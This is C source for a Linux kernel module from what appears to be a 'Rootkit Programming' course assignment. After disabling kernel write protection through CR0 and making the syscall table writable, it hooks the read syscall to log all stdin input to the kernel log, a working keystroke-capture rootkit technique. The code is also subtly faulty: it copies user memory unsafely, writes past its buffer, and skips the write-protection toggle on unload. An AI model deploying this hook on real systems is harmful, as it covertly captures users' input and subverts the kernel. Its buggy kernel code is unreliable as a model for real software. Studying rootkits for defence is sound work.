/*  
 *  mod.c - The first kernel module.
*/
#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
//#include <linux/list.h>
// Why can nr_processes be called directly?
#include <linux/sched.h>
#include <asm/cacheflush.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include "sysmap.h"

#define DRIVER_AUTHOR "Rootkit Programming"
#define DRIVER_DESC   "Assigment 1 - 5 LKM Programming"
#define BUF_SIZE 1024

void ** syscall_table = (void * *) sys_call_table_R;
ssize_t (*orig_sys_read)(int fd, void *buf, size_t count);
static char charbuf[BUF_SIZE]; //1k ought to be enough for everyone

static void print_nr_procs2(void)
{
	int i=0;
  // traversing scheduler linked list
	struct task_struct *task;
	for_each_process(task)
	{
		i++;
	}
	printk(KERN_INFO "Number of current running processes (traversing scheduler linked list): %d\n", i);
}

static void print_nr_procs()
{
  // cast system symbol adress to function pointer
  int a = ((int (*)(void))nr_processes_T)();
  printk(KERN_INFO "Number of current running processes (cast system symbol adress to function pointer): %d\n", a);
}

static ssize_t my_read(int fd, void *buf, size_t count){
	if(fd == 0){ //stdin
		//printk(KERN_INFO "count: %d\n", (int)count);
		strncpy(charbuf, buf, (count<BUF_SIZE-1)?count:BUF_SIZE-1);
		charbuf[count+1] = '\0';
		printk(KERN_INFO "stdin: %s\n", charbuf);
	}
	return orig_sys_read(fd, buf, count);
}

static int __init mod_init(void)
{
  unsigned long addr;
  int ret;
  unsigned long cr0;


  printk(KERN_INFO "Welcome!\n");
  printk(KERN_INFO "Read address: %p", syscall_table[0]);
  
  cr0 = read_cr0();
  write_cr0(cr0 & ~0x00010000);
  
  

  addr = (unsigned long) syscall_table;
  ret = set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3);
  if(ret){
	printk(KERN_INFO "Cannot set memory to rw\n");
  }
  else{
  	printk(KERN_INFO "Set memory to rw\n");
  }

  orig_sys_read = syscall_table[__NR_read];
  syscall_table[__NR_read] = my_read;

  write_cr0(cr0);

  return 0;
}

static void __exit mod_exit(void)
{
  unsigned long cr0;
  cr0 = read_cr0();
  syscall_table[__NR_read] = orig_sys_read;
  write_cr0(cr0);
  printk(KERN_INFO "Goodbye!\n");
}


    
module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
